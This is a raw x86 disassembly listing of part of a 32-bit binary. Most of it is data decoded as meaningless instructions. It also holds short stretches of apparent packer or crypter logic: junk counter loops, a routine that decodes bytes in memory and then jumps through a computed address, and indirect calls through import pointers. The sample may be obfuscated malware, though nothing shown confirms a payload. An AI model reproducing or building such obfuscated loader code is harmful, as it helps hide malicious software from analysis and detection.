  406340:	enter  0xbf2d,0x3a
  406344:	aas    
  406345:	and    BYTE PTR [ecx-0x548952f3],0x12
  40634c:	and    esp,DWORD PTR [ecx]
  40634e:	mov    WORD PTR [edx+0x587ad078],ds
  406354:	lods   eax,DWORD PTR ds:[esi]
  406355:	push   ebx
  406356:	in     eax,0x58
  406358:	inc    esp
  406359:	in     al,dx
  40635a:	mov    edi,0xbed6b61e
  40635f:	enter  0xb0da,0x7
  406363:	or     bl,BYTE PTR [edi+0x4e]
  406366:	cli    
  406367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406368:	enter  0x157c,0x92
  40636c:	aam    0x5
  40636e:	in     eax,0x98
  406370:	xchg   ebx,eax
  406371:	adc    BYTE PTR [edx+0x31],ah
  406374:	push   ss
  406375:	cmp    al,0xa7
  406377:	(bad)  
  406378:	pop    ecx
  406379:	push   eax
  40637a:	fnstenv [edi+0x6f]
  40637d:	aad    0x35
  40637f:	(bad)  
  406380:	stos   DWORD PTR es:[edi],eax
  406381:	int    0xd2
  406383:	pop    ss
  406384:	inc    ecx
  406385:	in     al,0x72
  406387:	lods   al,BYTE PTR ds:[esi]
  406388:	mov    al,0x7
  40638a:	iret   
  40638b:	popa   
  40638c:	(bad)  
  40638d:	jmp    0x1f42cf56
  406392:	xor    eax,ebx
  406394:	adc    BYTE PTR [ebp-0x7e],0x65
  406398:	sub    ebp,esi
  40639a:	push   cs
  40639b:	sbb    al,al
  40639d:	inc    edx
  40639e:	arpl   WORD PTR [edi-0x9],dx
  4063a1:	mov    al,0xf4
  4063a3:	and    BYTE PTR [esi],ah
  4063a5:	jno    0x40641b
  4063a7:	out    dx,eax
  4063a8:	xchg   edx,eax
  4063a9:	sbb    ah,bl
  4063ab:	mov    ch,0xf1
  4063ad:	lock inc esp
  4063af:	outs   dx,DWORD PTR ds:[esi]
  4063b0:	ins    DWORD PTR es:[edi],dx
  4063b1:	rdtsc  
  4063b3:	inc    ecx
  4063b4:	mov    ebp,0xff76b5d6
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0xfbe0,0xd2
  4063d1:	aam    0x2c
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40644d
  4063dc:	cmp    DWORD PTR [eax+0x0],eax
  4063df:	pop    edi
  4063e0:	sub    al,ch
  4063e2:	inc    edi
  4063e3:	scas   al,BYTE PTR es:[edi]
  4063e4:	dec    esi
  4063e5:	mov    cl,0x43
  4063e7:	push   0xc82b5873
  4063ec:	loope  0x40646d
  4063ee:	rcl    BYTE PTR [edx+0x697fd2a0],1
  4063f4:	js     0x406445
  4063f6:	loope  0x40640a
  4063f8:	int    0x4e
  4063fa:	out    0xe7,eax
  4063fc:	add    cl,BYTE PTR ds:0xe438fc98
  406402:	out    dx,eax
  406403:	push   eax
  406404:	rol    BYTE PTR [ecx-0x21],0x59
  406408:	div    BYTE PTR [esi-0x54304484]
  40640e:	mul    BYTE PTR [esi+0x2121143a]
  406414:	aas    
  406415:	jmp    0xcbf8:0x716c58fe
  40641c:	inc    eax
  40641d:	stc    
  40641e:	xchg   DWORD PTR [ebx+0x72ba37d9],ebp
  406424:	add    esi,ebx
  406426:	pop    ebp
  406427:	mov    eax,edx
  406429:	mov    eax,0xc9611fbb
  40642e:	mov    ds:0x7926815c,eax
  406433:	inc    edi
  406434:	mov    ds:0xacd7aca7,eax
  406439:	and    edi,0xffffff80
  40643c:	jb     0x4063c0
  40643e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40643f:	jmp    0xfcc4:0xc84cbb20
  406446:	mov    ds:0x4a6d8b52,al
  40644b:	xor    bl,BYTE PTR ds:0xb8394c95
  406451:	ja     0x406434
  406453:	fadd   DWORD PTR [ebx]
  406455:	xor    DWORD PTR [edi],0xaf893f84
  40645b:	and    al,dh
  40645d:	jne    0x406483
  40645f:	push   es
  406460:	xchg   esp,eax
  406461:	mov    ebx,0x9f46e026
  406466:	pop    ebx
  406467:	call   0x1748fda3
  40646c:	das    
  40646d:	push   ebp
  40646e:	push   ebx
  40646f:	pop    edi
  406470:	jge    0x4064b0
  406472:	add    DWORD PTR [ebx+0x53],ecx
  406475:	inc    edx
  406476:	pushf  
  406477:	jne    0x40646e
  406479:	xchg   DWORD PTR ds:0x17a96c8f,edx
  40647f:	cmp    DWORD PTR [ecx+edx*2],ebx
  406482:	mov    ebp,gs
  406484:	adc    cl,BYTE PTR [ebp-0x39]
  406487:	shl    esp,1
  406489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648a:	sub    al,dl
  40648c:	cld    
  40648d:	fild   DWORD PTR [edi+esi*8+0x1fea5836]
  406494:	sub    esi,ebx
  406496:	mov    ecx,0xfdaf5d3f
  40649b:	or     BYTE PTR [esi-0x75],ah
  40649e:	mov    dh,0x70
  4064a1:	arpl   WORD PTR [edi+0x1d],bx
  4064a4:	cli    
  4064a5:	into   
  4064a6:	add    DWORD PTR [eax],ebx
  4064a8:	int3   
  4064a9:	jnp    0x4064ed
  4064ab:	and    al,0x2b
  4064ad:	adc    ecx,edx
  4064af:	inc    ebx
  4064b0:	(bad)  
  4064b2:	add    BYTE PTR [ebx+edx*8+0x1ce9d443],al
  4064b9:	dec    edx
  4064ba:	add    al,0xa3
  4064bc:	js     0x406511
  4064be:	in     al,dx
  4064bf:	imul   eax,DWORD PTR ds:0x8471f200,0xff8f976f
  4064c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ca:	fsqrt  
  4064cc:	ds add DWORD PTR gs:[esp+ebx*4-0x1c],ecx
  4064d2:	pop    es
  4064d3:	loope  0x406502
  4064d5:	mov    dl,0x6e
  4064d7:	ret    0x86dc
  4064da:	sub    al,BYTE PTR [edi+0x4267ee96]
  4064e0:	jg     0x40654d
  4064e2:	movntps XMMWORD PTR [edx+0x2d],xmm0
  4064e6:	mov    esi,0x4064a1be
  4064eb:	mov    eax,ds:0xb53e4354
  4064f0:	sub    DWORD PTR [ebx-0x54],esi
  4064f3:	cdq    
  4064f4:	pop    edi
  4064f5:	pushf  
  4064f6:	mov    esi,0x7013966f
  4064fb:	add    esp,DWORD PTR ds:0x78bc880d
  406501:	add    DWORD PTR [esi+0x50a2986c],esi
  406507:	pop    eax
  406508:	int    0x32
  40650a:	mov    dl,0xb
  40650c:	xchg   esp,eax
  40650d:	call   0xf89c:0x99a567cb
  406514:	xor    edx,esp
  406516:	push   ds
  406517:	inc    ebp
  406518:	popf   
  406519:	mov    eax,0xbd1afd57
  40651e:	and    DWORD PTR [edi-0x60],0xd993faf1
  406525:	rol    edx,1
  406527:	jmp    0xb7f934b8
  40652c:	pop    ebx
  40652d:	add    BYTE PTR [esp+eax*1],dl
  406530:	jmp    0x6f55a924
  406535:	out    dx,eax
  406536:	mov    esp,DWORD PTR [ebp+edi*4-0x72]
  40653a:	mov    eax,0xc8712c9f
  40653f:	rcr    DWORD PTR [ebp+0x5b],1
  406542:	xchg   esi,eax
  406543:	push   es
  406544:	xchg   ecx,eax
  406545:	retf   0xc98f
  406548:	pop    eax
  406549:	jnp    0x406587
  40654b:	sub    esi,DWORD PTR [edi]
  40654d:	fucomp st(3)
  40654f:	aad    0xbb
  406551:	popa   
  406552:	jo     0x406525
  406554:	mov    cl,BYTE PTR [ebp-0x10972c2c]
  40655a:	lahf   
  40655b:	dec    esi
  40655c:	adc    esp,ecx
  40655e:	mov    ebp,0xccbc3bc4
  406563:	dec    ebx
  406564:	loope  0x406565
  406566:	shr    BYTE PTR [edx],1
  406568:	pop    esp
  406569:	lods   eax,DWORD PTR ds:[esi]
  40656a:	fcmovnb st,st(2)
  40656c:	mov    dl,0xb5
  40656e:	inc    ecx
  40656f:	push   ds
  406570:	jg     0x4065e3
  406572:	nop
  406573:	xchg   ebx,eax
  406574:	inc    eax
  406575:	out    dx,eax
  406576:	inc    ecx
  406577:	mov    eax,0x636a110c
  40657c:	das    
  40657d:	in     eax,0xb0
  40657f:	jg     0x406516
  406581:	xchg   edi,eax
  406582:	add    eax,0x582a8786
  406587:	(bad)  ds:0xb67a71b0
  40658d:	sub    esp,DWORD PTR [ebp+0x513ea887]
  406593:	sbb    bh,cl
  406595:	pop    edx
  406596:	cmp    al,BYTE PTR [edi]
  406598:	sar    BYTE PTR [esi],cl
  40659a:	xor    eax,0xa6a476e4
  40659f:	lods   eax,DWORD PTR ds:[esi]
  4065a0:	retf   0xd1ab
  4065a3:	inc    esp
  4065a4:	mov    edx,0x313b77aa
  4065a9:	arpl   bp,ax
  4065ab:	mov    al,0x6e
  4065ad:	dec    edi
  4065ae:	mov    dl,0x7a
  4065b0:	repz or dh,BYTE PTR [esi]
  4065b3:	(bad)  
  4065b5:	jl     0x40659f
  4065b7:	mov    fs,edi
  4065b9:	(bad)  
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x5b6adc27]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406686
  40660b:	dec    edx
  40660c:	adc    BYTE PTR [ebp+0x41],al
  40660f:	push   ebp
  406610:	sbb    DWORD PTR [ebp+0x53],0x27
  406614:	scas   al,BYTE PTR es:[edi]
  406615:	data16 int3 
  406617:	jp     0x406642
  406619:	sbb    bh,BYTE PTR [eax-0x356014dc]
  40661f:	jl     0x4065b2
  406621:	adc    esi,edi
  406623:	(bad)  
  406624:	jge    0x40669c
  406626:	sbb    BYTE PTR [esi],bh
  406628:	rcr    ebp,1
  40662a:	jg     0x4065bb
  40662c:	in     eax,0xb1
  40662e:	inc    esi
  40662f:	jl     0x406647
  406631:	leave  
  406632:	jl     0x40662d
  406634:	out    dx,eax
  406635:	jl     0x406638
  406637:	pop    edx
  406638:	enter  0x6d52,0x4
  40663c:	jg     0x406634
  40663e:	adc    al,0x3
  406640:	sbb    al,0x2a
  406642:	aaa    
  406643:	daa    
  406644:	push   edi
  406645:	push   ss
  406646:	sbb    dh,BYTE PTR [ebx-0x54a6cf4e]
  40664c:	jmp    0x950b7d79
  406651:	xrelease mov DWORD PTR [edi+0x74],esi
  406655:	sbb    al,0x78
  406657:	ret    
  406658:	add    DWORD PTR [esi],edx
  40665a:	mov    dh,0x36
  40665c:	jno    0x4066aa
  40665e:	in     eax,dx
  40665f:	and    ch,bl
  406661:	into   
  406662:	add    bh,0xc6
  406665:	jmp    0x75c83041
  40666a:	mov    bl,0xb7
  40666c:	retf   
  40666d:	imul   esi,DWORD PTR [esi+0x40],0x7b
  406671:	fsubp  st(3),st
  406673:	in     eax,dx
  406674:	xchg   esi,eax
  406675:	inc    edx
  406676:	xlat   BYTE PTR ds:[ebx]
  406677:	sub    al,0x99
  406679:	arpl   WORD PTR [edi],bp
  40667b:	retf   
  40667c:	popf   
  40667d:	push   ebx
  40667e:	or     BYTE PTR [ebx+0x7954ab3f],cl
  406684:	xchg   ebx,eax
  406685:	sbb    eax,0x628133da
  40668a:	xlat   BYTE PTR ds:[ebx]
  40668b:	cmp    BYTE PTR [edx],dh
  40668d:	sub    bl,dl
  40668f:	xchg   edi,eax
  406690:	cmp    eax,0xaa73054e
  406695:	pop    edi
  406696:	dec    ebx
  406697:	sbb    DWORD PTR [eax],edi
  406699:	sti    
  40669a:	jo     0x406679
  40669c:	cld    
  40669d:	sub    DWORD PTR [ecx],ebx
  40669f:	inc    eax
  4066a0:	sbb    al,0xd9
  4066a2:	lock jae 0x4066a8
  4066a5:	sub    al,0x88
  4066a7:	std    
  4066a8:	sub    al,dl
  4066aa:	mov    cl,0xc
  4066ac:	aaa    
  4066ad:	push   ss
  4066ae:	js     0x4066dc
  4066b0:	or     eax,0x34719166
  4066b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b6:	mov    ?,WORD PTR [ecx-0x4d]
  4066b9:	jle    0x406705
  4066bb:	pop    ebx
  4066bc:	das    
  4066bd:	bound  esp,QWORD PTR [ebx+0x2b9890df]
  4066c3:	xchg   ecx,eax
  4066c4:	rol    BYTE PTR [edx],0xae
  4066c7:	fiadd  DWORD PTR [eax+0x6d]
  4066ca:	push   es
  4066cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cc:	mov    ebx,DWORD PTR [ebx-0x7ca1c5d3]
  4066d2:	mov    al,fs:0xa09897df
  4066d8:	ja     0x406747
  4066da:	cwde   
  4066db:	int    0xe8
  4066dd:	push   ds
  4066de:	in     al,0x6e
  4066e0:	icebp  
  4066e1:	in     al,0x72
  4066e3:	mov    esp,0x49e26080
  4066e8:	dec    ebx
  4066e9:	sbb    edi,DWORD PTR [edx-0x18ef6ed1]
  4066ef:	bound  edi,QWORD PTR [eax+0x5b]
  4066f2:	add    al,0xdb
  4066f4:	aam    0xcf
  4066f6:	sub    DWORD PTR [eax-0x19],edi
  4066f9:	popa   
  4066fa:	cmp    al,0xd4
  4066fc:	dec    ecx
  4066fd:	mov    eax,0xa71cfc71
  406702:	jmp    0x47c71096
  406707:	(bad)  
  406708:	cmp    ebx,DWORD PTR [ecx]
  40670a:	stc    
  40670b:	xor    eax,0xe8c4b46b
  406710:	hlt    
  406711:	add    ah,BYTE PTR [ecx+ecx*2-0x6f]
  406715:	pushf  
  406716:	sti    
  406717:	adc    BYTE PTR [ecx+0x15],0x88
  40671b:	aam    0xad
  40671d:	pop    esp
  40671e:	fisubr WORD PTR [ebx+0x34]
  406721:	inc    esi
  406722:	sbb    al,BYTE PTR [ecx-0xbaf5d8a]
  406728:	mov    ecx,0x72308361
  40672d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40672f:	mov    bl,0xf9
  406731:	loop   0x4066d6
  406733:	xor    BYTE PTR [ebx],cl
  406735:	pop    edx
  406736:	out    0xac,eax
  406738:	push   edx
  406739:	inc    edi
  40673a:	adc    DWORD PTR [edx],ecx
  40673c:	inc    edx
  40673d:	xchg   DWORD PTR [eax+0x760e772a],edi
  406743:	popa   
  406744:	fistp  WORD PTR [ebx]
  406746:	mov    ch,0x66
  406748:	loop   0x4066e6
  40674a:	in     eax,dx
  40674b:	mov    dl,cl
  40674d:	icebp  
  40674e:	icebp  
  40674f:	mov    bh,0xa7
  406751:	mov    bl,0x2b
  406753:	xor    DWORD PTR gs:[ecx-0x3afe2ab5],eax
  40675a:	inc    ebp
  40675b:	xchg   DWORD PTR [ebp-0x78],ebp
  40675e:	into   
  40675f:	das    
  406760:	adc    cl,BYTE PTR ds:0x6990b3d7
  406766:	inc    ebp
  406767:	cmp    al,0x96
  406769:	cwde   
  40676a:	mov    ebp,0x956994dc
  40676f:	inc    edx
  406770:	test   dh,cl
  406772:	(bad)  
  406773:	mov    bh,0x62
  406775:	fcom   QWORD PTR [ebp-0x79540820]
  40677b:	in     eax,dx
  40677c:	call   0x90b20d16
  406781:	mov    ecx,ds
  406783:	cld    
  406784:	mov    ch,0x25
  406786:	bound  edi,QWORD PTR [edi+0x69defcde]
  40678c:	(bad)  
  40678d:	call   0xdd5c:0x36f2738d
  406794:	xchg   ebp,eax
  406795:	mov    dh,0x78
  406797:	cld    
  406798:	jl     0x406750
  40679a:	push   edi
  40679b:	test   eax,0xa90dc367
  4067a0:	push   cs
  4067a1:	fiadd  DWORD PTR [eax-0x27ecc12e]
  4067a7:	aaa    
  4067a8:	xor    bl,BYTE PTR es:[ecx]
  4067ab:	jne    0x406749
  4067ad:	push   edi
  4067ae:	mov    ebp,0x65f3825c
  4067b3:	push   0x4e
  4067b5:	imul   edx,ecx,0x76
  4067b8:	push   esi
  4067b9:	mov    eax,0x2ebc5564
  4067be:	mov    eax,gs
  4067c0:	leave  
  4067c1:	xchg   ecx,eax
  4067c2:	loopne 0x40680d
  4067c4:	and    al,0x63
  4067c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067c7:	xor    DWORD PTR [edi],ebp
  4067c9:	mov    esp,0x1809beee
  4067ce:	rcr    eax,0x30
  4067d1:	scas   al,BYTE PTR es:[edi]
  4067d2:	(bad)  
  4067d3:	fild   QWORD PTR [edx+0x13]
  4067d6:	pop    ds
  4067d7:	jmp    0x406801
  4067d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067da:	aam    0xc8
  4067dc:	mov    BYTE PTR [edi+0x78],dh
  4067df:	test   BYTE PTR [ebx+0x2a],bl
  4067e2:	aad    0x2f
  4067e4:	int3   
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xec4e:0x8bb4f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	gs js  0x4067f8
  406867:	mov    edx,0x4d768205
  40686c:	pusha  
  40686d:	(bad)  
  40686e:	pop    ecx
  40686f:	inc    esp
  406870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406871:	(bad)  
  406872:	pop    esp
  406873:	ins    DWORD PTR es:[edi],dx
  406874:	call   0x76cd3d37
  406879:	push   es
  40687a:	ret    0x86e8
  40687d:	sahf   
  40687e:	dec    ecx
  40687f:	inc    ebp
  406880:	pusha  
  406881:	mov    ch,BYTE PTR [eax-0x7fab7d73]
  406887:	rol    dl,0xe3
  40688a:	xchg   ebx,eax
  40688b:	jmp    0x175d:0x751ae0f0
  406892:	xchg   ecx,eax
  406893:	in     eax,0xed
  406895:	lods   eax,DWORD PTR ds:[esi]
  406896:	cwde   
  406897:	stos   DWORD PTR es:[edi],eax
  406898:	ret    0x937b
  40689b:	cmp    eax,0xc66f6cf2
  4068a0:	mov    edi,0x9d7d0556
  4068a5:	push   ds
  4068a6:	addr16 int 0x98
  4068a9:	pop    ebx
  4068aa:	sub    al,0xd4
  4068ac:	push   0x7f27b164
  4068b1:	and    BYTE PTR [ebx+edi*4],ch
  4068b4:	and    DWORD PTR [edx+0x58504624],edi
  4068ba:	loop   0x406890
  4068bc:	pop    esp
  4068bd:	sar    BYTE PTR [esi-0x552504c9],cl
  4068c3:	adc    ebp,esi
  4068c5:	xchg   BYTE PTR [esi],dl
  4068c7:	mov    esp,0x5b24360d
  4068cc:	je     0x40692d
  4068ce:	xchg   ecx,ecx
  4068d0:	dec    esp
  4068d1:	push   ebp
  4068d2:	mov    eax,ds:0x1fa1aef0
  4068d7:	outs   dx,DWORD PTR ds:[esi]
  4068d8:	mov    BYTE PTR [esi+0x3f3a5300],cl
  4068de:	xor    BYTE PTR [edx],dh
  4068e0:	(bad)
  4068e3:	xor    al,0xac
  4068e5:	ficomp WORD PTR [edi+0x4f]
  4068e8:	pop    ebp
  4068e9:	in     al,0x3a
  4068eb:	mov    ds:0x769ec872,eax
  4068f0:	inc    ebx
  4068f1:	mov    esp,0x692e9a75
  4068f6:	das    
  4068f7:	int    0x96
  4068f9:	sub    BYTE PTR [ecx+0x47],bh
  4068fc:	adc    BYTE PTR [eax-0x120d4a08],dh
  406902:	push   eax
  406903:	retf   0x3153
  406906:	mov    dl,0x63
  406908:	jge    0x406965
  40690a:	retf   0xd7d6
  40690d:	inc    ebp
  40690e:	xchg   ebx,eax
  40690f:	jns    0x4068a3
  406911:	mov    eax,0x63e385b9
  406916:	loopne 0x406948
  406918:	sub    BYTE PTR [ecx+0x445b3b51],bl
  40691e:	loopne 0x40691b
  406920:	fdivr  st(1),st
  406922:	cmp    esp,DWORD PTR [esi]
  406924:	sub    DWORD PTR [edi-0x7a9fdb07],0xffffffb6
  40692b:	jmp    DWORD PTR [esi+0x13]
  40692e:	inc    eax
  40692f:	mov    BYTE PTR [esi],al
  406931:	test   dl,dh
  406933:	sti    
  406934:	loope  0x4069b3
  406936:	or     ebp,ecx
  406938:	repnz push eax
  40693a:	sub    DWORD PTR ds:[ebx],edi
  40693d:	sub    al,0xfd
  40693f:	dec    ecx
  406940:	and    bh,dl
  406942:	sub    BYTE PTR [esi-0x2c922a1b],ah
  406948:	sbb    ebx,0x5b5fbee
  40694e:	sbb    BYTE PTR [esi+0x57aa60ee],dl
  406954:	xor    eax,0x20df396e
  406959:	cs in  eax,0x82
  40695c:	pop    ebp
  40695d:	dec    esp
  40695e:	fdiv   QWORD PTR [ecx+0x13]
  406961:	idiv   BYTE PTR [ecx]
  406963:	jmp    0x4069d3
  406965:	pop    esi
  406966:	loopne 0x40699c
  406968:	repnz mov ch,dl
  40696b:	mov    esp,ebx
  40696d:	and    dh,BYTE PTR [edi]
  40696f:	cmp    DWORD PTR [eax+0x3d],edx
  406972:	push   ebx
  406973:	cmp    eax,0xbd25c829
  406978:	aas    
  406979:	add    DWORD PTR [eax],esi
  40697b:	fisubr WORD PTR [edx]
  40697d:	iret   
  40697e:	adc    al,0xb8
  406980:	dec    eax
  406981:	add    eax,0xd11b8ba2
  406986:	push   edi
  406987:	adc    eax,0x536020d6
  40698c:	pop    ebp
  40698d:	fstp   DWORD PTR [esi+0x26b292ab]
  406993:	xchg   DWORD PTR [eax-0x3ea2d3c5],edx
  406999:	not    DWORD PTR [eax]
  40699b:	fdivr  QWORD PTR [ebx-0x55]
  40699e:	dec    ebx
  40699f:	xor    eax,0x5a8b0a3d
  4069a4:	mov    dh,0xcb
  4069a6:	in     eax,dx
  4069a7:	lahf   
  4069a8:	or     BYTE PTR [ebp+0xc4ff766],dl
  4069ae:	cmp    bh,BYTE PTR [bp+si]
  4069b1:	int    0x3a
  4069b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b4:	xchg   DWORD PTR [edx+0x5c733119],esi
  4069ba:	adc    al,0x70
  4069bc:	or     eax,0xe46c49b8
  4069c1:	mov    ds:0x3c4551ec,al
  4069c6:	pushf  
  4069c7:	xchg   ebp,eax
  4069c8:	dec    esi
  4069c9:	sbb    eax,0x98433f29
  4069ce:	shl    BYTE PTR [edi+0x339356b0],1
  4069d4:	das    
  4069d5:	mov    ebp,0xa618f04e
  4069da:	(bad)  
  4069db:	es popf 
  4069dd:	mov    dl,0x3f
  4069df:	fld1   
  4069e1:	adc    ebp,eax
  4069e3:	jnp    0x406982
  4069e5:	shr    BYTE PTR [eax-0x22a3e744],1
  4069eb:	in     eax,0x46
  4069ed:	push   ss
  4069ee:	add    al,BYTE PTR [eax-0x80]
  4069f1:	fst    DWORD PTR [esi-0x3fab4165]
  4069f7:	ds mov dh,0xda
  4069fa:	push   eax
  4069fb:	pushf  
  4069fc:	sbb    ebp,ebx
  4069fe:	and    ecx,ebp
  406a00:	push   ebx
  406a01:	xor    al,0x6
  406a03:	mov    al,BYTE PTR [edx+ebp*2]
  406a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a07:	pushf  
  406a08:	fwait
  406a09:	ja     0x406a34
  406a0b:	fadd   QWORD PTR [ebp+0x25]
  406a0e:	mov    dh,0x5d
  406a10:	sbb    eax,ebp
  406a12:	aam    0xa8
  406a14:	sub    esp,DWORD PTR [ecx+esi*2+0x71af855a]
  406a1b:	sub    DWORD PTR [ebx-0x27fb505b],ecx
  406a21:	and    DWORD PTR [eax+0x55],0xffffffc2
  406a25:	icebp  
  406a26:	popf   
  406a27:	mov    ch,0x5
  406a29:	ins    DWORD PTR es:[edi],dx
  406a2a:	jno    0x406a9b
  406a2c:	pop    ss
  406a2d:	out    dx,eax
  406a2e:	addr16 push esi
  406a30:	jnp    0x406a58
  406a32:	sar    BYTE PTR [ebp+0x23],1
  406a35:	sub    BYTE PTR [eax-0x69d28b7d],dh
  406a3b:	es ins BYTE PTR es:[edi],dx
  406a3d:	pusha  
  406a3e:	std    
  406a3f:	pop    eax
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
